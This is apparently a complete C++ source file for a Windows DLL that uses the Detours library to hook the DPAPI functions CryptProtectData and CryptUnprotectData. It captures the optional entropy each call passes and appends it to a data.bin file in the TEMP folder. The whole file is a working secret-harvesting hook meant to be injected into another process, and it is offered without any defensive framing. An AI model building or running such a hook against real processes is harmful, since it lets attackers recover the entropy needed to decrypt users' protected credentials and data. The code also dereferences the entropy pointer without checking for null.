// dllmain.cpp : Defines the entry point for the DLL application.

#include "stdafx.h"
#include <Windows.h>
#include <detours.h>
#include <dpapi.h>
#include <strsafe.h>
#pragma comment(lib, "crypt32.lib")



LPCWSTR lpOptionalEntropy = NULL;

VOID WriteEntropy() {
	const DWORD cbBuffer = 1024;
	TCHAR TempFolder[MAX_PATH];
	GetEnvironmentVariable(L"TEMP", TempFolder, MAX_PATH);
	TCHAR Path[MAX_PATH];
	StringCbPrintf(Path, MAX_PATH, L"%s\\data.bin", TempFolder);
	HANDLE hFile = CreateFile(Path, FILE_APPEND_DATA,  0, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	WCHAR  DataBuffer[cbBuffer];
	memset(DataBuffer, 0x00, cbBuffer);
	DWORD dwBytesWritten = 0;
	StringCbPrintf(DataBuffer, cbBuffer, L"Entropy: %s\n\n", lpOptionalEntropy);

	WriteFile(hFile, DataBuffer, wcslen(DataBuffer)*2, &dwBytesWritten, NULL);
	CloseHandle(hFile);
}

static DPAPI_IMP BOOL(WINAPI * OriginalCryptUnprotectData)(DATA_BLOB*, LPWSTR*, DATA_BLOB*, PVOID, CRYPTPROTECT_PROMPTSTRUCT*, DWORD, DATA_BLOB*) = CryptUnprotectData;
static DPAPI_IMP BOOL(WINAPI * OriginalCryptProtectData)(DATA_BLOB*, LPCWSTR, DATA_BLOB*, PVOID, CRYPTPROTECT_PROMPTSTRUCT*, DWORD, DATA_BLOB*) = CryptProtectData;

BOOL _CryptUnprotectData(DATA_BLOB* pDataIn, LPWSTR* ppszDataDescr, DATA_BLOB* pOptionalEntropy, PVOID pvReserved, CRYPTPROTECT_PROMPTSTRUCT* pPromptStruct, DWORD dwFlags, DATA_BLOB* pDataOut) {
	BYTE * pbOutData = pOptionalEntropy->pbData;
	lpOptionalEntropy = (LPCWSTR)((const wchar_t*)pbOutData);
	WriteEntropy();
	return OriginalCryptUnprotectData(pDataIn, ppszDataDescr, pOptionalEntropy, pvReserved, pPromptStruct, dwFlags, pDataOut);
}

BOOL _CryptProtectData(DATA_BLOB* pDataIn, LPCWSTR szDataDescr, DATA_BLOB* pOptionalEntropy, PVOID pvReserved, CRYPTPROTECT_PROMPTSTRUCT* pPromptStruct, DWORD dwFlags, DATA_BLOB* pDataOut) {
	BYTE * pbOutData = pOptionalEntropy->pbData;
	lpOptionalEntropy = (LPCWSTR)((const wchar_t*)pbOutData);
	WriteEntropy();
	return OriginalCryptProtectData(pDataIn, szDataDescr, pOptionalEntropy, pvReserved, pPromptStruct, dwFlags, pDataOut);
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD  dwReason, LPVOID lpReserved)
{
	if (DetourIsHelperProcess()) {
		return TRUE;
	}

	if (dwReason == DLL_PROCESS_ATTACH) {
		DetourRestoreAfterWith();
		DetourTransactionBegin();
		DetourUpdateThread(GetCurrentThread());
		DetourAttach(&(PVOID&)OriginalCryptUnprotectData, _CryptUnprotectData);
		DetourAttach(&(PVOID&)OriginalCryptProtectData, _CryptProtectData);
		DetourTransactionCommit();
	}
	else if (dwReason == DLL_PROCESS_DETACH) {
		DetourTransactionBegin();
		DetourUpdateThread(GetCurrentThread());
		DetourDetach(&(PVOID&)OriginalCryptUnprotectData, _CryptUnprotectData);
		DetourDetach(&(PVOID&)OriginalCryptProtectData, _CryptProtectData);
		DetourTransactionCommit();

	}
	return TRUE;
}